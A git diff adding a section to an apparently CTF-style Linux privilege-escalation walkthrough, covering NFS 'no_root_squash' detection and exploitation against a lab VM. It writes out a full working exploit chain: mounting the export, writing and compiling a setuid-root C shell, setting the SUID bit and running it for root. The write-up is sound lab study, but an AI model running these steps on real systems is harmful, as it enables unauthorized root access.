@@ -738,13 +738,33 @@ root@debian:/home#
 
 ![image](https://github.com/user-attachments/assets/4bd5020f-cdf5-456f-9705-6270cf1bbf7a)
 
-```bash
-
-```
 
 <br>
 
 <h2>Task 19 . Privilege Escalation - NFS Root Squashing</h2>
+
+<h3>Detection</h3>
+
+<p>Linux VM<br>
+
+1. In command line type: <code>cat /etc/exports</code><br>
+2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.</p>
+
+<h3>Exploitation</h3>
+
+<p>Attacker VM<br>
+
+1. Open command prompt and type: <code>showmount -e 10.10.223.247</code><br>
+2. In command prompt type: <code>mkdir /tmp/1</code><br>
+3. In command prompt type: <code>mount -o rw,vers=2 10.10.223.247:/tmp /tmp/1</code><br>
+In command prompt type: <code>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c</code><br>
+4. In command prompt type: <code>gcc /tmp/1/x.c -o /tmp/1/x</code><br>
+5. In command prompt type: <code>chmod +s /tmp/1/x</code></p>
+
+<p>Linux VM<br>
+
+1. In command prompt type: <code>/tmp/x</code><br>
+2. In command prompt type: <code>id</code></p>
 
 <h3 align="left">Answer the question below</h3>
 
